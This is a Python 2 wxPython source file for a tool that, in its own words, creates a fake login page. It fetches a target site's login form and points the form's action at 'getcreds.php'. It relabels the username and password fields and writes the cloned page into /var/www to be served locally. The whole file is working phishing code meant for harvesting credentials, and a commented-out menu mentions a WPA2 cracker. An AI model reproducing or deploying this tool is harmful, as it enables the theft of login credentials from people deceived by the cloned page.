try:
	import wx
	from wxPython.wx import *
	import wx.html
except ImportError as error:
	#~ raise ImportError("Detected Python3 +")
	print 'Python 3 detected'
import os
import urllib2, httplib, redirecthandle
import re
from bs4 import BeautifulSoup

class pageCreator(wx.Frame):
    
    global bSoup
    
    def __init__(self, parent, id):
      wx.Frame.__init__(self, parent, id)
      
      panel = wx.Panel(self,-1)
      wx.StaticText(panel, -1, 'Create a fake login page')
      ifcbtn = wx.Button(panel, label='Fake the page', pos=(20,150))
      ifcbtn.Bind(wx.EVT_BUTTON, self.executeInfernal)
      
      self.bSoup = wx.TextCtrl(panel, -1, "", style=wx.TE_MULTILINE,pos=(30, 200),size=(700,350))
      
  
      
      #bSoup.AppendText('alsdkfjaldskjf')
      

      self.CreateStatusBar()
      self.SetSize((800,500))
      #~ menuBar = wx.MenuBar()
      #~ menu = wx.Menu()
      #~ menu.Append(99,  "&WPA2 Cracker", "Crack WPA/WPA2 handshakes")
      #~ menuBar.Append(menu, "&Cracker")
      #~ self.SetMenuBar(menuBar)
      #~ self.Bind(wx.EVT_MENU, self.openfile, id=99)
      #~ self.Destroy()
      
	
    #~ def openfile(self, event):
    

   #~ 
    def executeInfernal(self, e):
		
		
		
		def get_login_page():
			
			def ask(parent=None, message='', default_value=''):
				dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
				dlg.ShowModal()
				result = dlg.GetValue()
				dlg.Destroy()
				return result
			#
			
			target_url = str(ask(message = 'Enter the target URL')).strip()
			
			httplib.HTTPConnection.debuglevel=1
			request = urllib2.Request(target_url)
			opener = urllib2.build_opener(redirecthandle.SmartRedirectHandler())
			f = opener.open(request)
	##article = re.sub(r'(?is)</html>.+', '</html>', article)
			redirect = f.url
	##response = urllib2.urlopen('https://google.com')
			html = f.read()
			#print "Found the login page here: " + f.url
	########## regex search and replace
			regex = re.search(r'action="([^"]*)".*?', html)
			post_action = str(regex.group(0))
	
			#~ print "*" * 20
			#~ print 'modifying the login page...'
			new_login = html.replace(post_action, 'action=getcreds.php') 
	##### create a login page
			index_page = open('/var/www/index2.html','wb')
			index_page.write(new_login)
			index_page.close()
	
	############# MOFIYING THE POST SCRIPT
	
			myhtml = open('/var/www/index2.html', 'r')

			read_html = myhtml.read()

			myhtml.close()

			number = 0

			html_proc = BeautifulSoup(read_html)

			inputs =  html_proc.findAll('input')
			panel = wx.Panel(self,-1)
			
			wx.StaticText(panel, -1, '')
			#self.bSoup = wx.TextCtrl(panel, -1, "", style=wx.TE_MULTILINE,pos=(30, 200),size=(500,350))
			#input_file = open('input_file.txt', 'wb')
			#self.bSoup.AppendText('adsf')
			
			for i in inputs:
				#print str(number) +": " +str(i)
				number = number + 1
				self.bSoup.AppendText(str(number) +": " +str(i)+"\n")
			#	input_file.write(str(number) +": " +str(i))
			#input_file.close()
			
				
			def ask(parent=None, message='', default_value=''):
				dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
				dlg.ShowModal()
				result = dlg.GetValue()
				dlg.Destroy()
				return result
				


			
	
	#username_select = input('Please choose the username or email ID in numeric representation: ')
			
		
			user = str(ask(message = 'Enter Username/Email')).strip()
			password = str(ask(message = 'Enter Password')).strip()
			
			


			
			tmp = read_html.replace('name="'+user+'"','name="username"').replace('name="'+password+'"', 'name="password"')
	
			new_page = open('/var/www/index.html', 'wb')
			new_page.write(tmp)
			new_page.close()
			os.system('firefox http://localhost/index.html &')
			
			
			
		get_login_page()
		
class MyNotepad(wx.App):
	def OnInit(self):
		wx.InitAllImageHandlers()
		frame_1 = pageCreator(None, -1)
		self.SetTopWindow(frame_1)
		frame_1.Show()
		
		return 1
# end of class MyNotepad
#if __name__ == "__main__":

def openit():
	app = MyNotepad()
	app.MainLoop()

#~ openit()
